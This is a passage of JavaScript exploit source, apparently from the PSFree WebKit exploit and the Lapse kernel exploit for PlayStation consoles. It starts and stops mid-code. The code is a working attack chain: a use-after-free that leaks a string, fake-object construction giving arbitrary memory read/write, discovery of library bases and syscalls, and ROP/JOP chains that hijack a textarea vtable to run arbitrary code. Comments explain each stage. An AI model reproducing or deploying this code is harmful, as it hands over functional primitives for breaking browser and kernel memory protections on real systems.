      view.write32(off_strimpl_strlen, 0xffffffff);
      break;
    }
    strs.length = 0;
    gc();
    await sleep();
    str_wait++;
  }
  //log(`JSString reused memory at loop: ${str_wait}`);
  const idx = view.read32(off_strimpl_inline_str + marker_offset);
  //log(`str index: ${hex(idx)}`);
  //log('view:');
  //log(view);
  // versions like 8.0x have a JSC::JSString that have their own m_length
  // field. strings consult that field instead of the m_length of their
  // StringImpl
  //
  // we work around this by passing the string to Error.
  // ErrorInstance::create() will then create a new JSString initialized from
  // the StringImpl of the message argument
  const rstr = Error(strs[idx]).message;
  //log(`str len: ${hex(rstr.length)}`);
  if (rstr.length === 0xffffffff) {
    //log('confirmed correct leaked');
    const addr = view.read64(off_strimpl_m_data).sub(off_strimpl_inline_str);
    //log(`view's buffer address: ${addr}`);
    return new Reader(rstr, view);
  }
  die('JSString was not modified');
}
//================================================================================================
// PSFREE STAGE3 MAKE ARW ========================================================================
//================================================================================================
async function make_arw(reader, view2, pop) {
  const rdr = reader;
  // we have to align the fake object to atomSize (16) else the process
  // crashes. we don't know why
  // since cells (GC memory chunks) are always aligned to atomSize, there
  // might be code that's assuming that all GC pointers are aligned
  // see atomSize from WebKit/Source/JavaScriptCore/heap/MarkedBlock.h at PS4 8.0x
  const fakeobj_off = 0x20;
  const off_size_jsobj = 0x10;
  const fakebt_base = fakeobj_off + off_size_jsobj;
  // sizeof JSC::IndexingHeader
  const indexingHeader_size = 8;
  // sizeof JSC::ArrayStorage
  const arrayStorage_size = 0x18;
  // there's only the .raw property
  const propertyStorage = 8;
  const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;
  //log('STAGE: leak CodeBlock');
  // has too be greater than 0x10. the size of JSImmutableButterfly
  const bt_size = 0x10 + fakebt_off + arrayStorage_size;
  const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);
  const view = rdr.rstr_view;
  const view_p = rdr.m_data.sub(off_strimpl_inline_str);
  const view_save = new Uint8Array(view);
  view.fill(0);
  make_ssv_data(view2, view, view_p, bt_addr, bt_size);
  const bt = new BufferView(pop.state);
  view.set(view_save);
  //log('ArrayBuffer pointing to JSImmutableButterfly:');
  //for (var i = 0; i < bt.byteLength; i += 8) {
  //  log(`${bt.read64(i)} | ${hex(i)}`);
  //}
  // for the GC to scan index 0
  bt.write32(8, 0);
  bt.write32(0xc, 0);
  // the immutable butterfly's indexing type is ArrayWithInt32 so
  // JSImmutableButterfly::visitChildren() won't ask the GC to scan its slots
  // for JSObjects to recursively visit. this means that we can write
  // anything to the the butterfly's data area without fear of a GC crash
  const val_true = 7; // JSValue of "true"
  const strs_cell = rdr.read64(strs_addr);
  bt.write64(fakeobj_off, strs_cell);
  bt.write64(fakeobj_off + off_js_butterfly, bt_addr.add(fakebt_off));
  // since .raw is the first ever created property, it's just besides the
  // indexing header
  bt.write64(fakebt_off - 0x10, val_true);
  // indexing header's publicLength and vectorLength
  bt.write32(fakebt_off - 8, 1);
  bt.write32(fakebt_off - 8 + 4, 1);
  // custom ArrayStorage that allows read/write to index 0. we have to use an
  // ArrayStorage because the structure assigned to the structure ID expects
  // one so visitButterfly() will crash if we try to fake the object with a
  // regular butterfly
  // m_sparseMap
  bt.write64(fakebt_off, 0);
  // m_indexBias
  bt.write32(fakebt_off + 8, 0);
  // m_numValuesInVector
  bt.write32(fakebt_off + 0xc, 1);
  // m_vector[0]
  bt.write64(fakebt_off + 0x10, val_true);
  // immutable_butterfly[0] = fakeobj;
  bt.write64(0x10, bt_addr.add(fakeobj_off));
  // the GC can scan index 0 now
  bt.write32(8, 1);
  bt.write32(0xc, 1);
  const fake = func()[0];
  //log(`fake.raw: ${fake.raw}`);
  //log(`fake[0]: ${fake[0]}`);
  //log(`fake: [${fake}]`);
  const test_val = 3;
  //log(`test setting fake[0] to ${test_val}`);
  fake[0] = test_val;
  if (fake[0] !== test_val) {
    //die(`unexpected fake[0]: ${fake[0]}`);
    die('unexpected fake[0]');
  }
  function addrof(obj) {
    fake[0] = obj;
    return bt.read64(fakebt_off + 0x10);
  }
  // m_mode = WastefulTypedArray, allocated buffer on the fastMalloc heap,
  // unlike FastTypedArray, where the buffer is managed by the GC. This
  // prevents random crashes.
  // See JSGenericTypedArrayView<Adaptor>::visitChildren() from
  // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayViewInlines.h at
  // PS4 8.0x.
  const off_size_view = 0x20;
  const worker = new DataView(new ArrayBuffer(1));
  const main_template = new Uint32Array(new ArrayBuffer(off_size_view));
  const leaker = {addr: null, 0: 0};
  const worker_p = addrof(worker);
  const main_p = addrof(main_template);
  const leaker_p = addrof(leaker);
  // we'll fake objects using a JSArrayBufferView whose m_mode is
  // FastTypedArray. it's safe to use its buffer since it's GC-allocated. the
  // current fastSizeLimit is 1000. if the length is less than or equal to
  // that, we get a FastTypedArray
  const scaled_sview = off_size_view / 4;
  const faker = new Uint32Array(scaled_sview);
  const faker_p = addrof(faker);
  const faker_vector = rdr.read64(faker_p.add(off_view_m_vector));
  const vector_idx = off_view_m_vector / 4;
  const length_idx = off_view_m_length / 4;
  const mode_idx = off_view_m_mode / 4;
  const bt_idx = off_js_butterfly / 4;
  // fake a Uint32Array using GC memory
  faker[vector_idx] = worker_p.lo;
  faker[vector_idx + 1] = worker_p.hi;
  faker[length_idx] = scaled_sview;
  rdr.set_addr(main_p);
  faker[mode_idx] = rdr.read32_at(off_view_m_mode);
  // JSCell
  faker[0] = rdr.read32_at(0);
  faker[1] = rdr.read32_at(4);
  faker[bt_idx] = rdr.read32_at(off_js_butterfly);
  faker[bt_idx + 1] = rdr.read32_at(off_js_butterfly + 4);
  // fakeobj()
  bt.write64(fakebt_off + 0x10, faker_vector);
  const main = fake[0];
  //log('main (pointing to worker):');
  //for (var i = 0; i < off_size_view; i += 8) {
  //  const idx = i / 4;
  //  log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
  //}
  new Memory(
    main, worker, leaker,
    leaker_p.add(off_js_inline_prop),
    rdr.read64(leaker_p.add(off_js_butterfly))
  );
  //log('achieved arbitrary r/w');
  rdr.restore();
  // set the refcount to a high value so we don't free the memory, view's
  // death will already free it (a StringImpl is currently using the memory)
  view.write32(0, -1);
  // ditto (a SerializedScriptValue is currently using the memory)
  view2.write32(0, -1);
  // we don't want its death to call fastFree() on GC memory
  make_arw._buffer = bt.buffer;
}
//================================================================================================
// PSFree Exploit Function =======================================================================
//================================================================================================
async function doPSFreeExploit() {
  window.log("Starting PSFree Exploit...");
  try {
    window.log("PSFree STAGE 1/3: UAF SSV");
    await sleep(50); // Wait 50ms
    const [fsets, indices] = prepare_uaf();
    const [view, [view2, pop]] = await uaf_ssv(fsets, indices[1], indices[0]);
    window.log("PSFree STAGE 2/3: Get String Relative Read Primitive");
    await sleep(50); // Wait 50ms
    const rdr = await make_rdr(view);
    for (const fset of fsets) {
      fset.rows = '';
      fset.cols = '';
    }
    window.log("PSFree STAGE 3/3: Achieve Arbitrary Read/Write Primitive");
    await sleep(50); // Wait 50ms
    await make_arw(rdr, view2, pop);
    window.log("Achieved Arbitrary R/W\n");
  } catch (error) {
    window.log("An error occured during PSFree\nPlease refresh page and try again...\nError definition: " + error, "red");
    return 0;
  }
  return 1;
}
//================================================================================================

/* Copyright (C) 2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20). It
// takes advantage of a bug in aio_multi_delete(). Take a look at the comment
// at the race_one() function here for a brief summary.

// debug comment legend:
// * PANIC - code will make the system vulnerable to a kernel panic or it will
//   perform a operation that might panic
// * RESTORE - code will repair kernel panic vulnerability
// * MEMLEAK - memory leaks that our code will induce

// sys/mman.h
const MAP_SHARED = 1;
const MAP_FIXED = 0x10;
const MAP_ANON = 0x1000;
const MAP_PREFAULT_READ = 0x00040000;
// sys/rtprio.h
const RTP_LOOKUP = 0;
const RTP_SET = 1;
const RTP_PRIO_ITHD = 1;
const RTP_PRIO_REALTIME = 2;
const RTP_PRIO_NORMAL = 3;
const RTP_PRIO_IDLE = 4;
//
const PROT_READ = 0x01;
const PROT_WRITE = 0x02;
const PROT_EXEC = 0x04;
// SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
// has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
// group. queue 0 of each group is currently unused. queue 1 has the lowest
// priority and queue 3 has the highest
//
// the SceFsstAIO workers will process entries at the main queues. they will
// refill the main queues from the corresponding wait queues each time they
// dequeue a request (e.g. fill the  low priority main queue from the low
// priority wait queue)
//
// entries on the wait queue will always have a 0 ticket number. they will
// get assigned a nonzero ticket number once they get put on the main queue
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
// max number of requests that can be created/polled/canceled/deleted/waited
const max_aio_ids = 0x80;
var off_kstr;
var off_cpuid_to_pcpu;
var off_sysent_661;
var jmp_rsi;
//var patch_elf_loc;
var pthread_offsets;
var syscall_array;
var libwebkit_base;
var libkernel_base;
var libc_base;
var webkit_gadget_offsets;
var libc_gadget_offsets;
var libkernel_gadget_offsets;
var gadgets;
var off_ta_vt;
var off_wk_stack_chk_fail;
var off_scf;
var off_wk_strlen;
var off_strlen;
var Chain;
var chain;
var nogc;
var text_magic;
// put the sycall names that you want to use here
var syscall_map;
// highest priority we can achieve given our credentials
// Initialize rtprio lazily to avoid TDZ issues
var rtprio = null;
// the various SceAIO syscalls that copies out errors/states will not check if
// the address is NULL and will return EFAULT. this dummy buffer will serve as
// the default argument so users don't need to specify one
var _aio_errors = null;
// Initialize _aio_errors_p lazily to avoid TDZ issues with mem
var _aio_errors_p = null;

function get_view_vector(view) {
  if (!ArrayBuffer.isView(view)) {
    throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
  }
  if (mem === null) {
    throw Error('mem is not initialized. make_arw() must be called first to initialize mem.');
  }
  return mem.addrof(view).readp(off_view_m_vector);
}

function rw_write64(u8_view, offset, value) {
  if (!(value instanceof Int)) {
    throw TypeError('write64 value must be an Int');
  }
  const low = value.lo;
  const high = value.hi;
  for (var i = 0; i < 4; i++) {
    u8_view[offset + i] = (low >>> (i * 8)) & 0xff;
  }
  for (var i = 0; i < 4; i++) {
    u8_view[offset + 4 + i] = (high >>> (i * 8)) & 0xff;
  }
}

// ROP chain manager base class
// Args:
//   stack_size: the size of the stack
//   upper_pad: the amount of extra space above stack
class ChainBase {
  constructor(stack_size=0x1000, upper_pad=0x10000) {
    this._is_dirty = false;
    this.position = 0;
    const return_value = new Uint32Array(4);
    this._return_value = return_value;
    this.retval_addr = get_view_vector(return_value);
    const errno = new Uint32Array(1);
    this._errno = errno;
    this.errno_addr = get_view_vector(errno);
    const full_stack_size = upper_pad + stack_size;
    const stack_buffer = new ArrayBuffer(full_stack_size);
    const stack = new DataView(stack_buffer, upper_pad);
    this.stack = stack;
    this.stack_addr = get_view_vector(stack);
    this.stack_size = stack_size;
    this.full_stack_size = full_stack_size;
  }
  // use this if you want to write a new ROP chain but don't want to allocate
  // a new instance
  empty() {
    this.position = 0;
  }
  // flag indicating whether .run() was ever called with this chain
  get is_dirty() {
    return this._is_dirty;
  }
  clean() {
    this._is_dirty = false;
  }
  dirty() {
    this._is_dirty = true;
  }
  check_allow_run() {
    if (this.position === 0) {
      throw Error('chain is empty');
    }
    if (this.is_dirty) {
      throw Error('chain already ran, clean it first');
    }
  }
  reset() {
    this.empty();
    this.clean();
  }
  get retval_int() {
    return this._return_value[0] | 0;
  }
  get retval() {
    return new Int(this._return_value[0], this._return_value[1]);
  }
  // return value as a pointer
  get retval_ptr() {
    return new Addr(this._return_value[0], this._return_value[1]);
  }
  set retval(value) {
    const values = lohi_from_one(value);
    const retval = this._return_value;
    retval[0] = values[0];
    retval[1] = values[1];
  }
  get retval_all() {
    const retval = this._return_value;
    return [new Int(retval[0], retval[1]), new Int(retval[2], retval[3])];
  }
  set retval_all(values) {
    const [a, b] = [lohi_from_one(values[0]), lohi_from_one(values[1])];
    const retval = this._return_value;
    retval[0] = a[0];
    retval[1] = a[1];
    retval[2] = b[0];
    retval[3] = b[1];
  }
  get errno() {
    return this._errno[0];
  }
  set errno(value) {
    this._errno[0] = value;
  }
  push_value(value) {
    const position = this.position;
    if (position >= this.stack_size) {
      throw Error(`no more space on the stack, pushed value: ${value}`);
    }
    const values = lohi_from_one(value);
    const stack = this.stack;
    stack.setUint32(position, values[0], true);
    stack.setUint32(position + 4, values[1], true);
    this.position += 8;
  }
  get_gadget(insn_str) {
    const addr = this.gadgets.get(insn_str);
    if (addr === undefined) {
      throw Error(`gadget not found: ${insn_str}`);
    }
    return addr;
  }
  push_gadget(insn_str) {
    this.push_value(this.get_gadget(insn_str));
  }
  push_call(func_addr, ...args) {
    const argument_pops = [
      'pop rdi; ret',
      'pop rsi; ret',
      'pop rdx; ret',
      'pop rcx; ret',
      'pop r8; ret',
      'pop r9; ret'
    ];
    if (args.length > 6) {
      throw TypeError('push_call() does not support functions that have more than 6 arguments');
    }
    for (var i = 0; i < args.length; i++) {
      this.push_gadget(argument_pops[i]);
      this.push_value(args[i]);
    }
    // The address of our buffer seems to be always aligned to 8 bytes.
    // SysV calling convention requires the stack is aligned to 16 bytes on
    // function entry, so push an additional 8 bytes to pad the stack. We
    // pushed a "ret" gadget for a noop.
    if ((this.position & (0x10 - 1)) !== 0) {
      this.push_gadget('ret');
    }
    if (typeof func_addr === 'string') {
      this.push_gadget(func_addr);
    } else {
      this.push_value(func_addr);
    }
  }
  push_syscall(syscall_name, ...args) {
    if (typeof syscall_name !== 'string') {
      throw TypeError(`syscall_name not a string: ${syscall_name}`);
    }
    const sysno = syscall_map.get(syscall_name);
    if (sysno === undefined) {
      throw Error(`syscall_name not found: ${syscall_name}`);
    }
    const syscall_addr = this.syscall_array[sysno];
    if (syscall_addr === undefined) {
      throw Error(`syscall number not in syscall_array: ${sysno}`);
    }
    this.push_call(syscall_addr, ...args);
  }
  // Sets needed class properties
  // Args:
  //   gadgets:
  //     A Map-like object mapping instruction strings (e.g. "pop rax; ret")
  //     to their addresses in memory.
  //   syscall_array:
  //     An array whose indices correspond to syscall numbers. Maps syscall
  //     numbers to their addresses in memory. Defaults to an empty Array.
  static init_class(gadgets, syscall_array=[]) {
    this.prototype.gadgets = gadgets;
    this.prototype.syscall_array = syscall_array;
  }
  // START: implementation-dependent parts
  // the user doesn't need to implement all of these. just the ones they need
  // Firmware specific method to launch a ROP chain
  // Proper implementations will check if .position is nonzero before
  // running. Implementations can optionally check .is_dirty to enforce
  // single-run gadget sequences
  run() {
    throw Error('not implemented');
  }
  // anything you need to do before the ROP chain jumps back to JavaScript
  push_end() {
    throw Error('not implemented');
  }
  push_get_errno() {
    throw Error('not implemented');
  }
  push_clear_errno() {
    throw Error('not implemented');
  }
  // get the rax register
  push_get_retval() {
    throw Error('not implemented');
  }
  // get the rax and rdx registers
  push_get_retval_all() {
    throw Error('not implemented');
  }
  // END: implementation-dependent parts
  // note that later firmwares (starting around > 5.00?), the browser doesn't
  // have a JIT compiler. we programmed in a way that tries to make the
  // resulting bytecode be optimal
  // we intentionally have an incomplete set (there's no function to get a
  // full 128-bit result). we only implemented what we think are the common
  // cases. the user will have to implement those other functions if they
  // need it
  do_call(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_call(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  call_void(...args) {
    this.do_call(...args);
  }
  call_int(...args) {
    this.do_call(...args);
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  call(...args) {
    this.do_call(...args);
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  do_syscall(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_syscall(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  syscall_void(...args) {
    this.do_syscall(...args);
  }
  syscall_int(...args) {
    this.do_syscall(...args);
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  syscall(...args) {
    this.do_syscall(...args);
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  syscall_ptr(...args) {
    this.do_syscall(...args);
    const retval = this._return_value;
    return new Addr(retval[0], retval[1]);
  }
  // syscall variants that throw an error on errno
  do_syscall_clear_errno(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_clear_errno();
      this.push_syscall(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  sysi(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  sys(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  sysp(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    const retval = this._return_value;
    return new Addr(retval[0], retval[1]);
  }
}

function get_gadget(map, insn_str) {
  const addr = map.get(insn_str);
  if (addr === undefined) {
    throw Error(`gadget not found: ${insn_str}`);
  }
  return addr;
}

// Chain implementation based on Chain803. Replaced offsets that changed
// between versions. Replaced gadgets that were missing with new ones that
// won't change the API.
// gadgets for the JOP chain
// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
// because jop1-5 was the original chain used by the old implementation of
// Chain803. Now the sequence is jop1-3 then to jop2-5.
// When the scrollLeft getter native function is called on PS4 9.00, rsi is the
// JS wrapper for the WebCore textarea class.
const jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
// jop1 pushed another object (via the call instruction) but we want no
// extra objects between the return address and the rbp that will be pushed by
// jop2 later. So we pop the return address pushed by jop1.
// This will make pivoting back easy, just "leave; ret".
const jop2 = `
pop rsi
jmp qword ptr [rax + 0x1c]
`;
const jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be ignored
const jop4 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`;
const jop5 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop6 = `
push rdx
jmp qword ptr [rax]
`;
const jop7 = 'pop rsp; ret';
// the ps4 firmware is compiled to use rbp as a frame pointer
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const jop8 = `
mov rdi, qword ptr [rsi + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x70]
`;
const jop9 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop10 = `
mov rdx, qword ptr [rdx + 0x50]
mov ecx, 0xa
call qword ptr [rax + 0x40]
`;
const jop11 = `
pop rsi
cmc
jmp qword ptr [rax + 0x7c]
`;

function resolve_import(import_addr) {
  if (import_addr.read16(0) !== 0x25ff) {
    throw Error(
      `instruction at ${import_addr} is not of the form: jmp qword`
      + ' [rip + X]');
  }
  // module_function_import:
  //     jmp qword [rip + X]
  //     ff 25 xx xx xx xx // signed 32-bit displacement
  const disp = import_addr.read32(2);
  // assume disp and offset are 32-bit integers
  // x | 0 will always be a signed integer
  const offset = (disp | 0) + 6;
  // The rIP value used by "jmp [rip + X]" instructions is actually the rIP
  // of the next instruction. This means that the actual address used is
  // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
  // jump instruction, which is 6 in this case.
  const function_addr = import_addr.readp(offset);
  return function_addr;
}

// these values came from analyzing dumps from CelesteBlue
function check_magic_at(p, is_text) {
  const value = [p.read64(0), p.read64(8)];
  return value[0].eq(text_magic[0]) && value[1].eq(text_magic[1]);
}

function find_base(addr, is_text, is_back) {
  // align to page size
  addr = align(addr, page_size);
  text_magic = [
    new Int(0xe5894855, 0x56415741),
    new Int(0x54415541, 0x8d485053)
  ];
  const offset = (is_back ? -1 : 1) * page_size;
  while (true) {
    if (check_magic_at(addr, is_text)) {
      break;
    }
    addr = addr.add(offset);
  }
  return addr;
}

function get_bases() {
  if (mem === null) {
    throw Error('mem is not initialized. make_arw() must be called first to initialize mem.');
  }
  const off_jsta_impl = 0x18;
  const textarea = document.createElement('textarea');
  const webcore_textarea = mem.addrof(textarea).readp(off_jsta_impl);
  const textarea_vtable = webcore_textarea.readp(0);
  // Debugging log; find offset off_ta_vt
  //log("off_ta_vt: " + (textarea_vtable - find_base(textarea_vtable, true, true)));
  //throw Error('Operation cancelled!');
  libwebkit_base = textarea_vtable.sub(off_ta_vt);
  const stack_chk_fail_import = libwebkit_base.add(off_wk_stack_chk_fail);
  const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
  // Debugging log; find offset off_scf
  //log("off_scf: " + (stack_chk_fail_addr - find_base(stack_chk_fail_addr, true, true)));
  //throw Error('Operation cancelled!');
  libkernel_base = stack_chk_fail_addr.sub(off_scf);
  const strlen_import = libwebkit_base.add(off_wk_strlen);
  const strlen_addr = resolve_import(strlen_import);
  // Debugging log; find offset off_strlen
  //log("off_strlen: " + (strlen_addr - find_base(strlen_addr, true, true)));
  //throw Error('Operation cancelled!');
  libc_base = strlen_addr.sub(off_strlen);
}

function init_gadget_map(gadget_map, offset_map, base_addr) {
  for (const [insn, offset] of offset_map) {
    gadget_map.set(insn, base_addr.add(offset));
  }
}

class Chain900Base extends ChainBase {
  push_end() {
    this.push_gadget('leave; ret');
  }
  push_get_retval() {
    this.push_gadget('pop rdi; ret');
    this.push_value(this.retval_addr);
    this.push_gadget('mov qword ptr [rdi], rax; ret');
  }
  push_get_errno() {
    this.push_gadget('pop rdi; ret');
    this.push_value(this.errno_addr);
    this.push_call(this.get_gadget('__error'));
    this.push_gadget('mov rax, qword ptr [rax]; ret');
    this.push_gadget('mov dword ptr [rdi], eax; ret');
  }
  push_clear_errno() {
    this.push_call(this.get_gadget('__error'));
    this.push_gadget('pop rsi; ret');
    this.push_value(0);
    this.push_gadget('mov dword ptr [rax], esi; ret');
  }
}
class Chain700_852 extends Chain900Base {
  constructor() {
    super();
    const [rdx, rdx_bak] = mem.gc_alloc(0x58);
    const off_js_cell = 0;
    rdx.write64(off_js_cell, this._empty_cell);
    rdx.write64(0x50, this.stack_addr);
    this._rsp = mem.fakeobj(rdx);
  }
  run() {
    this.check_allow_run();
    this._rop.launch = this._rsp;
    this.dirty();
  }
}
class Chain900_960 extends Chain900Base {
  constructor() {
    super();
    // Create a DOM object (textarea) which is used as the exploit pivot source.
    var textarea = document.createElement('textarea');
    this._textarea = textarea;
    // Get the JS and WebCore pointers associated with the textarea element.
    var js_ta = mem.addrof(textarea);
    var webcore_ta = js_ta.readp(0x18);
    this._webcore_ta = webcore_ta;
    // Allocate a fake vtable.
    // - Uint8Array is lightweight and fast.
    // - 0x200 bytes is enough for all required gadget offsets.
    // - A reference is stored to prevent garbage collection.
    var vtable = new Uint8Array(0x200);
    var old_vtable_p = webcore_ta.readp(0);
    this._vtable = vtable; // Prevent GC
    this._old_vtable_p = old_vtable_p; // Used for possible restore
    // Write needed JOP entry gadgets into the fake vtable.
    rw_write64(vtable, 0x1b8, this.get_gadget(jop1));
    if ((config_target >= 0x900) && (config_target < 0x950)) {
      rw_write64(vtable, 0xb8, this.get_gadget(jop2));
      rw_write64(vtable, 0x1c, this.get_gadget(jop3));
    } else {
      rw_write64(vtable, 0xb8, this.get_gadget(jop11));
      rw_write64(vtable, 0x7c, this.get_gadget(jop3));
    }
    // Allocate rax_ptrs, which serves as the JOP pointer table.
    // - This buffer must be referenced on the class instance to avoid GC.
    var rax_ptrs = new Uint8Array(0x100);
    var rax_ptrs_p = get_view_vector(rax_ptrs);
    this._rax_ptrs = rax_ptrs; // Prevent GC
    rw_write64(rax_ptrs, 0x30, this.get_gadget(jop4));
    rw_write64(rax_ptrs, 0x58, this.get_gadget(jop5));
    rw_write64(rax_ptrs, 0x10, this.get_gadget(jop6));
    rw_write64(rax_ptrs, 0x00, this.get_gadget(jop7));
    // Stack pivot target
    rw_write64(this._rax_ptrs, 0x18, this.stack_addr);
    // Allocate jop_buffer which holds a pointer to rax_ptrs.
    // - Must also be preserved to prevent garbage collection.
    var jop_buffer = new Uint8Array(8);
    var jop_buffer_p = get_view_vector(jop_buffer);
    this._jop_buffer = jop_buffer; // Prevent GC
    rw_write64(jop_buffer, 0, rax_ptrs_p);
    // Link jop_buffer into the fake vtable.
    // - This is the actual JOP entry point used by WebKit.
    rw_write64(vtable, 8, jop_buffer_p);
  }
  run() {
    this.check_allow_run();
    // change vtable
    this._webcore_ta.write64(0, get_view_vector(this._vtable));
    // jump to JOP chain
    this._textarea.scrollLeft;
    // restore vtable
    this._webcore_ta.write64(0, this._old_vtable_p);
    this.dirty();
  }
}

// creates an ArrayBuffer whose contents is copied from addr
function make_buffer(addr, size) {
  // see enum TypedArrayMode from
  // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
  // at webkitgtk 2.34.4
  //
  // see possiblySharedBuffer() from
  // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
  // at webkitgtk 2.34.4

  // We will create an OversizeTypedArray via requesting an Uint8Array whose
  // number of elements will be greater than fastSizeLimit (1000).
  //
  // We will not use a FastTypedArray since its m_vector is visited by the
  // GC and we will temporarily change it. The GC expects addresses from the
  // JS heap, and that heap has metadata that the GC uses. The GC will likely
  // crash since valid metadata won't likely be found at arbitrary addresses.
  //
  // The FastTypedArray approach will have a small time frame where the GC
  // can inspect the invalid m_vector field.
  //
  // Views created via "new TypedArray(x)" where "x" is a number will always
  // have an m_mode < WastefulTypedArray.
  const u = new Uint8Array(1001);
  const u_addr = mem.addrof(u);
  // we won't change the butterfly and m_mode so we won't save those
  const old_addr = u_addr.read64(off_view_m_vector);
  const old_size = u_addr.read32(off_view_m_length);
  u_addr.write64(off_view_m_vector, addr);
  u_addr.write32(off_view_m_length, size);
  const copy = new Uint8Array(u.length);
  copy.set(u);
  // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
  // associated with them, if we ask for view.buffer, the view will be
  // converted into a WastefulTypedArray and an ArrayBuffer will be created.
  // This is done by calling slowDownAndWasteMemory().
  //
  // We can't use slowDownAndWasteMemory() on u since that will create a
  // JSC::ArrayBufferContents with its m_data pointing to addr. On the
  // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
  // cause a crash if the m_data is not from the fastMalloc heap, and even if
  // it is, freeing abitrary addresses is dangerous as it may lead to a
  // use-after-free.
  const res = copy.buffer;
  // restore
  u_addr.write64(off_view_m_vector, old_addr);
  u_addr.write32(off_view_m_length, old_size);
  return res;
}

function init_syscall_array(
  syscall_array,
  libkernel_web_base,
  max_search_size
) {
  if ((typeof max_search_size !== 'number') || !isFinite(max_search_size) || (Math.floor(max_search_size) !== max_search_size)) {
    throw TypeError(
      `max_search_size is not a integer: ${max_search_size}`);
  }
  if (max_search_size < 0) {
    throw Error(`max_search_size is less than 0: ${max_search_size}`);
  }
  const libkernel_web_buffer = make_buffer(
    libkernel_web_base,
    max_search_size
  );
  const kbuf = new BufferView(libkernel_web_buffer);
  // Search 'rdlo' string from libkernel_web's .rodata section to gain an
  // upper bound on the size of the .text section.
  var text_size = 0;
  var found = false;
  for (var i = 0; i < max_search_size; i++) {
    if (kbuf[i] === 0x72
      && kbuf[i + 1] === 0x64
      && kbuf[i + 2] === 0x6c
      && kbuf[i + 3] === 0x6f
    ) {
      text_size = i;
      found = true;
      break;
    }
  }
  if (!found) {
    throw Error(
      '"rdlo" string not found in libkernel_web, base address:'
      + ` ${libkernel_web_base}`);
  }
  // search for the instruction sequence:
  // syscall_X:
  //     mov rax, X
  //     mov r10, rcx
  //     syscall
  for (var i = 0; i < text_size; i++) {
    if (kbuf[i] === 0x48
      && kbuf[i + 1] === 0xc7
      && kbuf[i + 2] === 0xc0
      && kbuf[i + 7] === 0x49
      && kbuf[i + 8] === 0x89
      && kbuf[i + 9] === 0xca
      && kbuf[i + 10] === 0x0f
      && kbuf[i + 11] === 0x05
    ) {
      const syscall_num = kbuf.read32(i + 3);
      syscall_array[syscall_num] = libkernel_web_base.add(i);
      // skip the sequence
      i += 11;
    }
  }
}

function rop_init() {
  get_bases();
  init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
